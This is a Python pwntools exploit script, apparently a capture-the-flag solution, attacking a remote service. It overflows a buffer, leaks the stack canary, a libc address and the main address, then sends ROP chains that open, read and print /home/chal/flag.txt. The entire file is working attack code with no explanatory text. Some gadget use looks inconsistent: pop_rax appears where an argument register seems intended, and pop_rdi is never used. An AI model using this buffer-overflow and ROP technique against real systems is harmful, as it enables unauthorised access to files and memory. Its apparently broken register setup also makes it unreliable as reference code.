from pwn import *
context.arch = 'amd64'

# r = process('./share/chal')
r = remote("10.113.184.121", 10056)
puts_plt = 0x1110
puts_got = 0x3F80
read_plt = 0x1160

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
file_address = b'/home/chal/flag.txt'.ljust(0x38, b'\x00')

payload = b'a' * 20
r.recvuntil(b"Haaton's name? ")
r.send(payload)
r.recvlines(2)
# leak stack info
payload = b'HACHAMA'.ljust(0x8, b'\x00')
r.send(payload)
stack_context = r.recv(0x61)
for i in range(12):
    print(hex(u64(stack_context[i*8:i*8+8])))
canary = u64(stack_context[0x38:0x40])
print("Canary: " + hex(canary))
libc_start_main = u64(stack_context[0x48:0x50])
libc_base = libc_start_main - 0x29d90 # 0x29d90 is the offset of __libc_start_main
print("libc_base: " + hex(libc_base))
main_adress = u64(stack_context[0x58:0x60]) 
print("main_adress: " + hex(main_adress))
bss_base = main_adress - 0x331 # 0x331 is the offset of main
print("bss_base: " + hex(bss_base))
# raw_input()

bss_1 = bss_base + 0x3500 # memory for rop chain
bss_2 = bss_base + 0x3600
bss_3 = bss_base + 0x3700
pop_rax = libc_base + 0x45eb0
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_rbx = libc_base + 0x90529
syscall = libc_base + 0x91396

# Extend rbp space
extend_rbp = flat(bss_1, main_adress + 301)
r.send(b'a' * 0x38 + p64(canary) + extend_rbp)

# Open file
ropc_open = flat([bss_2, pop_rax, bss_1 - 0x40, pop_rdx_rbx, 0, 0, pop_rsi, 0, pop_rax, 0x2, syscall, main_adress + 301])
r.send(b'a' * 0x38 + p64(canary) + ropc_open)
# Read file
ropc_read = flat([bss_1, pop_rax, 3, pop_rsi, bss_3, pop_rdx_rbx, 0x30, 0, pop_rax, 0x0, syscall, main_adress + 301])
r.send(b'a' * 0x38 + p64(canary) + ropc_read)
# Write file
ropc_write = flat([bss_2, pop_rax, 1, pop_rsi, bss_3, pop_rdx_rbx, 0x30, pop_rax, 0x1, syscall, 0])
r.send(b'a' * 0x38 + p64(canary) + ropc_write)

r.interactive()
